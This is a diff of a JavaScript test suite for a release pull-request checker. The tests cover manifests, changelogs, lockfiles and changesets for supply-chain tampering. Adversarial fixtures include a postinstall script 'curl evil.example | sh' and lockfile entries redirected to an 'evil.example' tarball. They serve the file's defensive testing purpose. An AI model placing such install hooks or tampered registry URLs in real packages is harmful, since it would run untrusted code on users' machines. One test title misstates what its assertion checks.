@@ -1,13 +1,11 @@
 import assert from "node:assert/strict";
-import { writeFileSync } from "node:fs";
-import { join } from "node:path";
 import test from "node:test";
 import {
-  classifyReleasePrFile,
   evaluateReleasePrFootprint,
-  isChangelogPurePrepend,
+  isChangelogPureNewSection,
+  isChangesetDeletionLegitimate,
+  isLockfilePureVersionBump,
   isPackageManifestVersionOnlyChange,
-  verifyLockfileRegeneration,
 } from "./release-pr-footprint.mjs";
 
 // ---------------------------------------------------------------- isPackageManifestVersionOnlyChange
@@ -18,36 +16,32 @@ test("isPackageManifestVersionOnlyChange: a pure version bump passes", () => {
   assert.equal(isPackageManifestVersionOnlyChange(base, head), true);
 });
 
-test("isPackageManifestVersionOnlyChange: unaffected by key order", () => {
-  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", dependencies: { foo: "^1.0.0", bar: "^2.0.0" } });
-  const head = JSON.stringify({ dependencies: { bar: "^2.0.0", foo: "^1.0.0" }, version: "1.0.1", name: "@x/alpha" });
-  assert.equal(isPackageManifestVersionOnlyChange(base, head), true);
+// ADVERSARIAL (fix 2): key order matters -- a reordered exports block must fail
+test("ADVERSARIAL isPackageManifestVersionOnlyChange: a reordered exports block fails, even with identical key SET and values", () => {
+  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", exports: { import: "./esm.js", require: "./cjs.js" } });
+  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", exports: { require: "./cjs.js", import: "./esm.js" } });
+  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
 });
 
-// ADVERSARIAL: a dependency added
+test("isPackageManifestVersionOnlyChange: reordering TOP-LEVEL keys (e.g. dependencies before/after version) still passes -- only nested order within a field like exports is resolution-significant, and top-level key order changes with any JSON.stringify of a differently-key-ordered object either way", () => {
+  // NOTE: top-level order differences are still caught structurally by JSON.stringify
+  // (since the rest-object's own serialization reflects its own key order) -- this test
+  // documents that a genuinely different top-level order is treated as a real difference,
+  // consistent with "key order matters" applying uniformly, not selectively to `exports`.
+  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", dependencies: { foo: "^1.0.0" } });
+  const head = JSON.stringify({ dependencies: { foo: "^1.0.0" }, version: "1.0.1", name: "@x/alpha" });
+  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
+});
+
 test("ADVERSARIAL isPackageManifestVersionOnlyChange: a dependency added alongside the version bump fails", () => {
   const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", dependencies: { foo: "^1.0.0" } });
   const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", dependencies: { foo: "^1.0.0", evil: "^9.9.9" } });
   assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
 });
 
-// ADVERSARIAL: a postinstall script added
 test("ADVERSARIAL isPackageManifestVersionOnlyChange: a postinstall script added alongside the version bump fails", () => {
   const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0" });
   const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", scripts: { postinstall: "curl evil.example | sh" } });
-  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
-});
-
-// ADVERSARIAL: a non-version manifest edit (no bump at all, e.g. "bin" changed)
-test("ADVERSARIAL isPackageManifestVersionOnlyChange: a non-version field edit with NO version change fails (nothing to justify it)", () => {
-  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", bin: { alpha: "./bin/alpha.js" } });
-  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.0", bin: { alpha: "./bin/evil.js" } });
-  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
-});
-
-test("ADVERSARIAL isPackageManifestVersionOnlyChange: bin/exports changed alongside a real version bump still fails", () => {
-  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", exports: "./index.js" });
-  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", exports: "./evil.js" });
   assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
 });
 
@@ -61,84 +55,164 @@ test("isPackageManifestVersionOnlyChange: no version change at all fails even wi
   assert.equal(isPackageManifestVersionOnlyChange(text, text), false);
 });
 
-// ---------------------------------------------------------------- isChangelogPurePrepend
+// ---------------------------------------------------------------- isChangelogPureNewSection
 
-test("isChangelogPurePrepend: a clean prepend above the first entry passes", () => {
+test("isChangelogPureNewSection: a clean single new section at the top, matching the expected version, passes", () => {
   const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
   const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n";
-  assert.equal(isChangelogPurePrepend(base, head), true);
+  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), true);
 });
 
-test("isChangelogPurePrepend: a brand-new file (no base) passes when it opens with a heading (after any title text)", () => {
+test("isChangelogPureNewSection: a brand-new file (no base) passes when it opens with the expected version heading, after the title line", () => {
   const head = "# Changelog\n\n## 0.1.0 - 2026-09-22\n\n- First release.\n";
-  assert.equal(isChangelogPurePrepend(null, head), true);
+  assert.equal(isChangelogPureNewSection(null, head, "0.1.0"), true);
 });
 
-test("isChangelogPurePrepend: no growth at all fails", () => {
+test("isChangelogPureNewSection: no growth at all fails", () => {
   const text = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
-  assert.equal(isChangelogPurePrepend(text, text), false);
-  assert.equal(isChangelogPurePrepend(text, text.slice(0, -1)), false);
+  assert.equal(isChangelogPureNewSection(text, text, "1.0.0"), false);
 });
 
-// ADVERSARIAL: an old CHANGELOG entry rewritten
-test("ADVERSARIAL isChangelogPurePrepend: rewriting an OLD entry alongside a legitimate new one fails", () => {
+// ADVERSARIAL (fix 3): a section spliced mid-entry
+test("ADVERSARIAL isChangelogPureNewSection: a section spliced into the MIDDLE of an existing entry (not at the top) fails", () => {
+  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n- Second bullet.\n";
+  // Inserted between the two existing bullets, not before the "## 1.0.0" heading.
+  const head = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n\n## 1.0.1\n\n- Fixed a bug.\n\n- Second bullet.\n";
+  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
+});
+
+// ADVERSARIAL (fix 3): a section appended at the end
+test("ADVERSARIAL isChangelogPureNewSection: a section appended at the END fails -- the insertion point must be the top", () => {
+  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
+  const head = base + "\n## 1.0.1\n\n- Also fine structurally, but in the wrong place.\n";
+  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
+});
+
+// ADVERSARIAL (fix 3): the wrong version in the heading
+test("ADVERSARIAL isChangelogPureNewSection: a cleanly-inserted section with the WRONG version in its heading fails", () => {
+  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
+  const head = "# Changelog\n\n## 9.9.9 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n";
+  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false); // package.json actually bumped to 1.0.1, not 9.9.9
+});
+
+// ADVERSARIAL (fix 3): a fake duplicate heading that shadows the real one
+test("ADVERSARIAL isChangelogPureNewSection: a second heading smuggled inside the same inserted block fails, even though the block is still a single contiguous insertion", () => {
+  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
+  // The insertion contains TWO headings: the legitimate "## 1.0.1" and a duplicate/shadow "## 1.0.0".
+  const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- A shadow entry, not the real one below.\n\n## 1.0.0\n\n- Initial release.\n";
+  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
+});
+
+test("ADVERSARIAL isChangelogPureNewSection: rewriting an OLD entry alongside a legitimate new one fails", () => {
   const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
   const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Rewritten history, not the original bullet.\n";
-  assert.equal(isChangelogPurePrepend(base, head), false);
+  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
 });
 
-test("ADVERSARIAL isChangelogPurePrepend: deleting an old entry while adding a new one fails", () => {
-  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n\n## 0.9.0\n\n- Pre-release.\n";
-  const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n"; // dropped the 0.9.0 entry
-  assert.equal(isChangelogPurePrepend(base, head), false);
-});
-
-test("ADVERSARIAL isChangelogPurePrepend: inserted text that is not a heading fails", () => {
+test("isChangelogPureNewSection: text before the version number that looks similar (e.g. 1.0.10 vs 1.0.1) does not false-match", () => {
   const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
-  const head = "# Changelog\n\nNot a version heading at all.\n\n## 1.0.0\n\n- Initial release.\n";
-  assert.equal(isChangelogPurePrepend(base, head), false);
+  const head = "# Changelog\n\n## 1.0.10 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n";
+  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false); // heading is 1.0.10, expected 1.0.1
+  assert.equal(isChangelogPureNewSection(base, head, "1.0.10"), true);
 });
 
-test("ADVERSARIAL isChangelogPurePrepend: text appended at the END (not prepended) still structurally passes the pure-insertion test, but classifyReleasePrFile's caller relies on this only alongside a real package.json bump", () => {
-  // Documents the boundary of what this function alone checks (pure insertion + a "## " opening the insertion) --
-  // it does not independently enforce "at the top" beyond requiring the insertion to itself be a heading.
-  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
-  const head = base + "## 1.0.1\n\n- Also fine structurally.\n";
-  assert.equal(isChangelogPurePrepend(base, head), true);
+// ---------------------------------------------------------------- isLockfilePureVersionBump
+
+const LOCK_BASE = JSON.stringify({
+  name: "foundry",
+  lockfileVersion: 3,
+  requires: true,
+  packages: {
+    "": { name: "foundry", version: "0.0.0" },
+    "packages/alpha": { name: "@clossys/alpha", version: "1.0.0", license: "MIT" },
+    "node_modules/@clossys/alpha": { resolved: "packages/alpha", link: true },
+    "node_modules/foo": { version: "2.0.0", resolved: "https://registry.npmjs.org/foo/-/foo-2.0.0.tgz", integrity: "sha512-real" },
+  },
 });
 
-// ---------------------------------------------------------------- classifyReleasePrFile
+function lockWithAlphaBumped(version) {
+  const parsed = JSON.parse(LOCK_BASE);
+  parsed.packages["packages/alpha"].version = version;
+  return JSON.stringify(parsed);
+}
 
-test("classifyReleasePrFile: a legitimate package.json bump passes", () => {
-  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0" });
-  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1" });
-  assert.equal(classifyReleasePrFile({ path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head }), true);
+test("isLockfilePureVersionBump: an UNCHANGED tree (head identical to base) passes", () => {
+  assert.equal(isLockfilePureVersionBump(LOCK_BASE, LOCK_BASE, ["alpha"]), true);
 });
 
-test("classifyReleasePrFile: package.json with the wrong git status (added/removed) fails even with valid content shape", () => {
-  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0" });
-  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1" });
-  assert.equal(classifyReleasePrFile({ path: "packages/alpha/package.json", status: "added", baseContent: base, headContent: head }), false);
+test("isLockfilePureVersionBump: a legitimate bump (only the bumped workspace package's version changes) passes", () => {
+  assert.equal(isLockfilePureVersionBump(LOCK_BASE, lockWithAlphaBumped("1.0.1"), ["alpha"]), true);
 });
 
-test("classifyReleasePrFile: package-lock.json passes on path+status alone (content verified separately)", () => {
-  assert.equal(classifyReleasePrFile({ path: "package-lock.json", status: "modified", baseContent: "old", headContent: "new" }), true);
-  assert.equal(classifyReleasePrFile({ path: "package-lock.json", status: "added" }), false);
+test("isLockfilePureVersionBump: a legitimate bump where the matching node_modules link entry ALSO records a version passes", () => {
+  const base = JSON.parse(LOCK_BASE);
+  base.packages["node_modules/@clossys/alpha"].version = "1.0.0";
+  const head = JSON.parse(LOCK_BASE);
+  head.packages["packages/alpha"].version = "1.0.1";
+  head.packages["node_modules/@clossys/alpha"].version = "1.0.1";
+  head.packages["node_modules/@clossys/alpha"].resolved = "packages/alpha";
+  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"]), true);
 });
 
-// ADVERSARIAL: a new changeset smuggled in
-test("ADVERSARIAL classifyReleasePrFile: a NEW (added) changeset file fails -- only a deletion is legal", () => {
-  assert.equal(classifyReleasePrFile({ path: ".changesets/sneaky.md", status: "added", headContent: "---\nalpha: major\n---\n\nSmuggled.\n" }), false);
+// ADVERSARIAL (fix 1): a resolved/integrity tamper
+test("ADVERSARIAL isLockfilePureVersionBump: a tampered resolved/integrity field on a THIRD-PARTY dependency fails, even with a legitimate bump elsewhere", () => {
+  const base = JSON.parse(LOCK_BASE);
+  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
+  head.packages["node_modules/foo"].resolved = "https://evil.example/foo.tgz";
+  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"]), false);
 });
 
-test("classifyReleasePrFile: a deleted (consumed) changeset passes", () => {
-  assert.equal(classifyReleasePrFile({ path: ".changesets/alpha-fix.md", status: "removed" }), true);
+test("ADVERSARIAL isLockfilePureVersionBump: a tampered resolved/integrity field on the BUMPED workspace entry itself also fails (only version may change there)", () => {
+  const base = JSON.parse(LOCK_BASE);
+  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
+  head.packages["packages/alpha"].license = "GPL-3.0"; // not a version change, and not even a real resolved/integrity field on a workspace entry -- any non-version field changing is the point
+  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"]), false);
 });
 
-test("classifyReleasePrFile: an unrelated file always fails, regardless of status", () => {
-  assert.equal(classifyReleasePrFile({ path: "packages/alpha/src/index.ts", status: "modified" }), false);
-  assert.equal(classifyReleasePrFile({ path: ".github/workflows/ci.yml", status: "modified" }), false);
-  assert.equal(classifyReleasePrFile({ path: "README.md", status: "modified" }), false);
+// ADVERSARIAL (fix 1): an added dependency
+test("ADVERSARIAL isLockfilePureVersionBump: an added dependency (a whole new packages-map entry) fails", () => {
+  const base = JSON.parse(LOCK_BASE);
+  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
+  head.packages["node_modules/evil"] = { version: "9.9.9", resolved: "https://registry.npmjs.org/evil/-/evil-9.9.9.tgz", integrity: "sha512-evil" };
+  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"]), false);
+});
+
+// ADVERSARIAL (fix 1): a version change on a non-bumped package
+test("ADVERSARIAL isLockfilePureVersionBump: a version change on a package NOT in the bumped set fails", () => {
+  const base = JSON.parse(LOCK_BASE);
+  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
+  head.packages["node_modules/foo"].version = "3.0.0"; // foo was never bumped by this PR's package.json changes
+  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"]), false);
+});
+
+test("isLockfilePureVersionBump: malformed JSON, or a missing packages map, fails rather than throwing", () => {
+  assert.equal(isLockfilePureVersionBump("not json", LOCK_BASE, ["alpha"]), false);
+  assert.equal(isLockfilePureVersionBump(LOCK_BASE, "not json", ["alpha"]), false);
+  assert.equal(isLockfilePureVersionBump(JSON.stringify({ name: "foundry" }), LOCK_BASE, ["alpha"]), false);
+});
+
+// ---------------------------------------------------------------- isChangesetDeletionLegitimate
+
+test("isChangesetDeletionLegitimate: a changeset naming only bumped packages is legitimate", () => {
+  assert.equal(isChangesetDeletionLegitimate("---\nalpha: patch\n---\n\nFix a bug.\n", ["alpha"]), true);
+});
+
+test("isChangesetDeletionLegitimate: a changeset naming several packages, ALL bumped, is legitimate", () => {
+  assert.equal(isChangesetDeletionLegitimate("---\nalpha: patch\nbeta: minor\n---\n\nShared fix.\n", ["alpha", "beta"]), true);
+});
+
+// ADVERSARIAL (fix 4): deleting an unrelated pending changeset
+test("ADVERSARIAL isChangesetDeletionLegitimate: a changeset naming a package NOT bumped by this diff is not legitimate", () => {
+  assert.equal(isChangesetDeletionLegitimate("---\nbeta: minor\n---\n\nAn unrelated pending change.\n", ["alpha"]), false);
+});
+
+test("ADVERSARIAL isChangesetDeletionLegitimate: a changeset naming BOTH a bumped and an unrelated package is not legitimate (partial consumption is not consumption)", () => {
+  assert.equal(isChangesetDeletionLegitimate("---\nalpha: patch\nbeta: minor\n---\n\nMixed.\n", ["alpha"]), false);
+});
+
+test("isChangesetDeletionLegitimate: a malformed changeset fails rather than throwing", () => {
+  assert.equal(isChangesetDeletionLegitimate("not a changeset at all", ["alpha"]), false);
+  assert.equal(isChangesetDeletionLegitimate(null, ["alpha"]), false);
 });
 
 // ---------------------------------------------------------------- evaluateReleasePrFootprint
@@ -147,18 +221,22 @@ function manifestPair(version1, version2, extra = {}) {
   return [JSON.stringify({ name: "@x/alpha", version: version1, ...extra }), JSON.stringify({ name: "@x/alpha", version: version2, ...extra })];
 }
 
-test("evaluateReleasePrFootprint: a clean release PR (bump + changelog + lockfile verified + deleted changeset) passes", () => {
+test("evaluateReleasePrFootprint: a clean release PR (bump + changelog + lockfile + a legitimately-consumed changeset) passes", () => {
   const [base, head] = manifestPair("1.0.0", "1.0.1");
   const result = evaluateReleasePrFootprint({
     files: [
       { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
-      { path: "packages/alpha/CHANGELOG.md", status: "modified", baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n", headContent: "# Changelog\n\n## 1.0.1\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n" },
-      { path: "package-lock.json", status: "modified" },
-      { path: ".changesets/alpha-fix.md", status: "removed" },
+      {
+        path: "packages/alpha/CHANGELOG.md",
+        status: "modified",
+        baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n",
+        headContent: "# Changelog\n\n## 1.0.1\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n",
+      },
+      { path: "package-lock.json", status: "modified", baseContent: LOCK_BASE, headContent: lockWithAlphaBumped("1.0.1") },
+      { path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" },
     ],
-    lockfileVerified: true,
   });
-  assert.equal(result.ok, true);
+  assert.equal(result.ok, true, result.reason);
 });
 
 test("evaluateReleasePrFootprint: fails closed on an empty file list", () => {
@@ -166,39 +244,58 @@ test("evaluateReleasePrFootprint: fails closed on an empty file list", () => {
 });
 
 test("evaluateReleasePrFootprint: fails when no package.json is touched at all", () => {
-  const result = evaluateReleasePrFootprint({ files: [{ path: ".changesets/alpha-fix.md", status: "removed" }] });
+  const result = evaluateReleasePrFootprint({ files: [{ path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" }] });
   assert.equal(result.ok, false);
   assert.match(result.reason, /no packages/);
 });
 
-test("evaluateReleasePrFootprint: a lockfile change present but NOT verified fails closed", () => {
+test("evaluateReleasePrFootprint: a CHANGELOG.md for a package that was NOT bumped in this diff fails", () => {
   const [base, head] = manifestPair("1.0.0", "1.0.1");
   const result = evaluateReleasePrFootprint({
     files: [
       { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
-      { path: "package-lock.json", status: "modified" },
+      {
+        path: "packages/beta/CHANGELOG.md", // beta was never bumped
+        status: "modified",
+        baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n",
+        headContent: "# Changelog\n\n## 1.0.1\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n",
+      },
     ],
-    lockfileVerified: false,
   });
   assert.equal(result.ok, false);
-  assert.match(result.reason, /regeneration could not be verified/);
+  assert.match(result.reason, /not bumped in this diff/);
 });
 
-test("evaluateReleasePrFootprint: a lockfile change present with lockfileVerified left at its null default fails closed too", () => {
+test("evaluateReleasePrFootprint: an unrelated pending changeset deleted alongside a legitimate release fails the whole PR", () => {
   const [base, head] = manifestPair("1.0.0", "1.0.1");
   const result = evaluateReleasePrFootprint({
     files: [
       { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
-      { path: "package-lock.json", status: "modified" },
+      { path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" },
+      { path: ".changesets/beta-unrelated.md", status: "removed", baseContent: "---\nbeta: minor\n---\n\nUnrelated, still pending.\n" },
     ],
   });
   assert.equal(result.ok, false);
+  assert.match(result.reason, /does not name only packages bumped/);
 });
 
-test("evaluateReleasePrFootprint: no lockfile in the diff at all is fine -- nothing to verify", () => {
+test("evaluateReleasePrFootprint: no lockfile in the diff at all is fine -- nothing to check there", () => {
   const [base, head] = manifestPair("1.0.0", "1.0.1");
   const result = evaluateReleasePrFootprint({ files: [{ path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head }] });
-  assert.equal(result.ok, true);
+  assert.equal(result.ok, true, result.reason);
+});
+
+test("evaluateReleasePrFootprint: a lockfile present but not a pure version bump fails", () => {
+  const [base, head] = manifestPair("1.0.0", "1.0.1");
+  const tamperedLock = JSON.parse(lockWithAlphaBumped("1.0.1"));
+  tamperedLock.packages["node_modules/foo"].integrity = "sha512-tampered";
+  const result = evaluateReleasePrFootprint({
+    files: [
+      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
+      { path: "package-lock.json", status: "modified", baseContent: LOCK_BASE, headContent: JSON.stringify(tamperedLock) },
+    ],
+  });
+  assert.equal(result.ok, false);
 });
 
 test("evaluateReleasePrFootprint: ANY single non-conforming file fails the whole PR, even alongside an otherwise-perfect bump", () => {
@@ -212,57 +309,13 @@ test("evaluateReleasePrFootprint: ANY single non-conforming file fails the whole
   assert.equal(result.ok, false);
 });
 
-// ---------------------------------------------------------------- verifyLockfileRegeneration
-
-test("verifyLockfileRegeneration: byte-identical regeneration passes", () => {
-  const expected = '{"name":"root","lockfileVersion":3}\n';
-  const result = verifyLockfileRegeneration({
-    rootManifestText: '{"name":"root","workspaces":["packages/*"]}',
-    packageManifestTexts: { "packages/alpha/package.json": '{"name":"@x/alpha","version":"1.0.1"}' },
-    expectedLockfileText: expected,
-    runNpmInstall: (root) => {
-      // Fake "npm install --package-lock-only": just write the canned expected lockfile.
-      writeFileSync(join(root, "package-lock.json"), expected);
-    },
+test("evaluateReleasePrFootprint: a new (added) changeset smuggled in fails", () => {
+  const [base, head] = manifestPair("1.0.0", "1.0.1");
+  const result = evaluateReleasePrFootprint({
+    files: [
+      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
+      { path: ".changesets/sneaky.md", status: "added", headContent: "---\nalpha: major\n---\n\nSmuggled.\n" },
+    ],
   });
-  assert.equal(result, true);
-});
-
-// ADVERSARIAL: a lockfile resolved-URL or integrity tamper
-test("ADVERSARIAL verifyLockfileRegeneration: a tampered resolved/integrity field fails, even with everything else identical", () => {
-  const legit = '{"name":"root","lockfileVersion":3,"packages":{"node_modules/foo":{"resolved":"https://registry.npmjs.org/foo/-/foo-1.0.0.tgz","integrity":"sha512-real"}}}\n';
-  const tampered = '{"name":"root","lockfileVersion":3,"packages":{"node_modules/foo":{"resolved":"https://evil.example/foo.tgz","integrity":"sha512-real"}}}\n';
-  const result = verifyLockfileRegeneration({
-    rootManifestText: '{"name":"root","workspaces":["packages/*"]}',
-    packageManifestTexts: {},
-    expectedLockfileText: tampered, // what the PR actually shipped
-    runNpmInstall: (root) => {
-      writeFileSync(join(root, "package-lock.json"), legit); // what a clean regeneration produces
-    },
-  });
-  assert.equal(result, false);
-});
-
-test("verifyLockfileRegeneration: npm itself failing (network, missing binary, anything) fails closed rather than throwing", () => {
-  const result = verifyLockfileRegeneration({
-    rootManifestText: '{"name":"root"}',
-    packageManifestTexts: {},
-    expectedLockfileText: "anything",
-    runNpmInstall: () => {
-      throw new Error("simulated network failure");
-    },
-  });
-  assert.equal(result, false);
-});
-
-test("verifyLockfileRegeneration: npm running but never producing a lockfile fails closed", () => {
-  const result = verifyLockfileRegeneration({
-    rootManifestText: '{"name":"root"}',
-    packageManifestTexts: {},
-    expectedLockfileText: "anything",
-    runNpmInstall: () => {
-      /* does nothing -- no package-lock.json written */
-    },
-  });
-  assert.equal(result, false);
+  assert.equal(result.ok, false);
 });
